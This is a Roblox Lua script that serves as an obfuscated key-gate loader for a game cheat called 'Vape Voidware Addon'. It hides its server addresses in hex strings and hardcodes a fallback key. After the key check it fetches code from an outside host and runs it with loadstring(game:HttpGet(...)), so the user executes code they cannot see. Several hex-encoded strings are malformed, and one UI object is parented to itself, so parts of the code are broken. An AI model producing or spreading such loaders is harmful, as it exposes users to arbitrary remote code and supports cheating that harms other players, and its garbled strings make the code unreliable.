--[[ 
    PREMIUM CYBERPUNK KEY SYSTEM 2026 - SECURED EDITION
    Cấu hình Script: Vape Voidware Addon
]]

-- Hàm giải mã chuỗi nội bộ từ Hex sang String ký tự thường
local function _vX4(hexString)
    local decoded = {}
    for token in string.gmatch(hexString, "%S+") do
        table.insert(decoded, string.char(tonumber(token, 16)))
    end
    return table.concat(decoded)
end

-- Định tuyến tài nguyên hệ thống (Đã mã hóa để bảo mật thông tin máy chủ)
local Config_URL   = _vX4("68 74 74 70 73 3a 2f 2f 72 61 77 2e 67 69 74 68 75 62 75 73 65 72 63 6f 6e 74 65 6e 74 2e 63 6f 6d 2f 42 75 62 75 32 6b 2f 63 6f 6e 66 69 67 2e 74 78 74 2f 72 65 66 73 2f 68 65 61 64 73 2f 6d 61 69 6e 2f 63 6f 6e 66 69 67 2e 74 78 74") 
local File_Name    = _vX4("45 63 6c 69 70 73 65 4b 65 79 43 61 63 68 65 2e 74 78 74")
local MainAPI_URL  = _vX4("68 74 74 70 73 3a 2f 2f 66 6f 78 6e 61 6d 65 2e 74 6f 70 2f 6c 6f 61 64 65 72")
local Backup_URL   = _vX4("68 74 74 70 73 3a 2f 2f 66 75 6e 6c 69 6e 6b 2e 69 6f 2f 50 75 5f 73 32 77 63")
local Core_GuiName = _vX4("45 63 6c 69 70 73 65 4b e1 b9 a3 53 79 73 74 65 6d 5f 76 33")

---------------------------------------------------------
-- HỆ THỐNG TỰ ĐỘNG TẢI DỮ LIỆU CHỦ
---------------------------------------------------------
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local fetchedLink = Backup_URL
local fetchedKey = _vX4("76 69 65 74 6e 61 6d 37 36") -- "vietnam76" dự phòng

local success, response = pcall(function()
    return game:HttpGet(Config_URL)
end)

if success and response then
    local lines = {}
    for line in string.gmatch(response, "[^\r\n]+") do
        table.insert(lines, line)
    end
    if lines[1] then fetchedLink = string.gsub(lines[1], "%s+", "") end
    if lines[2] then fetchedKey = string.gsub(lines[2], "%s+", "") end
end

---------------------------------------------------------
-- HÀM KÍCH HOẠT SCRIPT CHÍNH (FOXNAME SOURCE)
---------------------------------------------------------
local function ExecuteMainScript()
    local loadSuccess, err = pcall(function()
        loadstring(game:HttpGet(MainAPI_URL))()
    end)
    
    if not loadSuccess then
        warn(_vX4("4c e1 69 20 53 63 72 69 70 74 20 56 61 70 65 20 56 6f 69 64 77 61 72 65 3a 20") .. tostring(err))
    end
end

---------------------------------------------------------
-- KIỂM TRA CHỨC NĂNG LƯU KEY TỰ ĐỘNG (AUTO LOGIN)
---------------------------------------------------------
if readfile and isfile and isfile(File_Name) then
    local savedKey = readfile(File_Name)
    if savedKey == fetchedKey then
        ExecuteMainScript()
        return 
    end
end

---------------------------------------------------------
-- KHỞI TẠO GIAO DIỆN CHUẨN
---------------------------------------------------------
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = Core_GuiName
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
MainFrame.BackgroundTransparency = 0.08
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.Size = UDim2.new(0, 350, 0, 230)

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 24)
UICorner.Parent = MainFrame

local DropShadow = Instance.new("ImageLabel")
DropShadow.Name = "DropShadow"
DropShadow.Parent = MainFrame
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
DropShadow.Size = UDim2.new(1, 60, 1, 60)
DropShadow.BackgroundTransparency = 1
DropShadow.Image = "rbxassetid://6015897843"
DropShadow.ImageColor3 = Color3.fromRGB(180, 0, 30)
DropShadow.ImageTransparency = 0.45
DropShadow.ZIndex = MainFrame.ZIndex - 1

local UIStroke = Instance.new("UIStroke")
UIStroke.Parent = MainFrame
UIStroke.Thickness = 3
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Color = Color3.fromRGB(255, 255, 255)

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 40)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 0, 5)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 40))
}
UIGradient.Parent = UIGradient

local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.Text = "SECURE ACCESS"
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 20
Title.Size = UDim2.new(1, 0, 0, 60)
Title.BackgroundTransparency = 1

local KeyInput = Instance.new("TextBox")
KeyInput.Parent = MainFrame
KeyInput.PlaceholderText = _vX4("4e 68 e1 ba ad 70 20 6d a3 20 6b 65 79 20 74 72 75 79 20 63 e1 ba ad 70 2e 2e 2e")
KeyInput.Text = ""
KeyInput.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
KeyInput.BackgroundTransparency = 0.2
KeyInput.Position = UDim2.new(0.08, 0, 0.33, 0)
KeyInput.Size = UDim2.new(0.84, 0, 0, 45)
KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.Font = Enum.Font.GothamSemibold
KeyInput.TextSize = 14

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 12)
InputCorner.Parent = KeyInput

local InputStroke = Instance.new("UIStroke")
InputStroke.Parent = KeyInput
InputStroke.Thickness = 1.5
InputStroke.Color = Color3.fromRGB(255, 0, 40)
InputStroke.Transparency = 0.7

local CopyBtn = Instance.new("TextButton")
CopyBtn.Parent = MainFrame
CopyBtn.Text = "GET KEY LINK"
CopyBtn.Font = Enum.Font.GothamBold
CopyBtn.TextSize = 12
CopyBtn.BackgroundColor3 = Color3.fromRGB(22, 14, 15)
CopyBtn.TextColor3 = Color3.fromRGB(255, 80, 90)
CopyBtn.Position = UDim2.new(0.08, 0, 0.60, 5)
CopyBtn.Size = UDim2.new(0.84, 0, 0, 32)

local CopyCorner = Instance.new("UICorner")
CopyCorner.CornerRadius = UDim.new(0, 10)
CopyCorner.Parent = CopyBtn

local SubmitBtn = Instance.new("TextButton")
SubmitBtn.Parent = MainFrame
SubmitBtn.Text = "ACTIVATE SCRIPT"
SubmitBtn.Font = Enum.Font.GothamBold
SubmitBtn.TextSize = 14
SubmitBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 40)
SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitBtn.Position = UDim2.new(0.08, 0, 0.79, 10)
SubmitBtn.Size = UDim2.new(0.84, 0, 0, 40)

local SubmitCorner = Instance.new("UICorner")
SubmitCorner.CornerRadius = UDim.new(0, 14)
SubmitCorner.Parent = SubmitBtn

---------------------------------------------------------
-- HỆ THỐNG KÉO THẢ MƯỢT MÀ
---------------------------------------------------------
local dragging, dragInput, dragStart, startPos
local function update(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then update(input) end
end)

---------------------------------------------------------
-- HIỆU ỨNG THÔNG BÁO & HOVER
---------------------------------------------------------
local function PlayHover(button, colorIn, sizeIn, colorOut, sizeOut)
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = colorIn, Size = sizeIn}):Play()
    end)
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = colorOut, Size = sizeOut}):Play()
    end)
end

PlayHover(CopyBtn, Color3.fromRGB(40, 20, 22), UDim2.new(0.86, 0, 0, 34), Color3.fromRGB(22, 14, 15), UDim2.new(0.84, 0, 0, 32))
PlayHover(SubmitBtn, Color3.fromRGB(190, 0, 25), UDim2.new(0.86, 0, 0, 42), Color3.fromRGB(255, 0, 40), UDim2.new(0.84, 0, 0, 40))

local function AdvancedNotify(msg, color)
    local NotifyGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    local Box = Instance.new("Frame", NotifyGui)
    local Text = Instance.new("TextLabel", Box)
    
    Box.Size = UDim2.new(0, 280, 0, 45)
    Box.Position = UDim2.new(0.5, -140, 0, -50)
    Box.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    Box.BackgroundTransparency = 0.1
    
    local BC = Instance.new("UICorner", Box) BC.CornerRadius = UDim.new(0, 12)
    local S = Instance.new("UIStroke", Box) S.Color = color S.Thickness = 2
    
    Text.Size = UDim2.new(1, 0, 1, 0)
    Text.BackgroundTransparency = 1
    Text.Text = msg
    Text.TextColor3 = Color3.fromRGB(255, 255, 255)
    Text.Font = Enum.Font.GothamBold
    Text.TextSize = 13
    
    TweenService:Create(Box, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -140, 0, 40)}):Play()
    task.wait(2.5)
    TweenService:Create(Box, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -140, 0, -50)}):Play()
    task.wait(0.4)
    NotifyGui:Destroy()
end

---------------------------------------------------------
-- LOGIC TƯƠNG TÁC NÚT BẤM
---------------------------------------------------------
CopyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(fetchedLink)
        CopyBtn.Text = "COPIED URL!"
        AdvancedNotify(_vX4("44 e1 a3 20 73 61 6f 20 63 68 e9 70 20 6c 69 6e 6b 20 67 65 74 20 6b 65 79 20 6d e1 bb 9b 69 20 6e 68 e1 a5 74 21"), Color3.fromRGB(255, 0, 40))
    else
        AdvancedNotify(_vX4("45 78 65 63 75 74 6f 72 20 6b 68 f4 6e 67 20 68 e1 bb 97 20 74 72 e1 bb a3 20 73 61 6f 20 63 68 e9 70 20 6e 68 61 6e 68 21"), Color3.fromRGB(255, 0, 40))
    end
    task.wait(2)
    CopyBtn.Text = "GET KEY LINK"
end)

SubmitBtn.MouseButton1Click:Connect(function()
    local userKey = KeyInput.Text
    
    if userKey == fetchedKey then
        SubmitBtn.Text = "ACCESS GRANTED!"
        SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 220, 110)
        SubmitBtn.TextColor3 = Color3.fromRGB(8, 8, 12)
        
        if writefile then
            pcall(function()
                writefile(File_Name, userKey)
            end)
        end
        
        TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}):Play()
        TweenService:Create(DropShadow, TweenInfo.new(0.3), {ImageTransparency = 1}):Play()
        task.wait(0.4)
        ScreenGui:Destroy()
        
        ExecuteMainScript()
    else
        SubmitBtn.Text = "ACCESS DENIED!"
        SubmitBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 20)
        AdvancedNotify(_vX4("4d a3 20 6b 68 f3 61 20 6b 68 f4 6e 67 20 63 68 ed 6e 68 20 74 72 e1 bb a3 63 20 68 a3 63 20 a7 d3 20 68 e1 bab 74 20 68 a1 6e 21"), Color3.fromRGB(255, 0, 40))
        task.wait(2)
        SubmitBtn.Text = "ACTIVATE SCRIPT"
        SubmitBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 40)
    end
end)
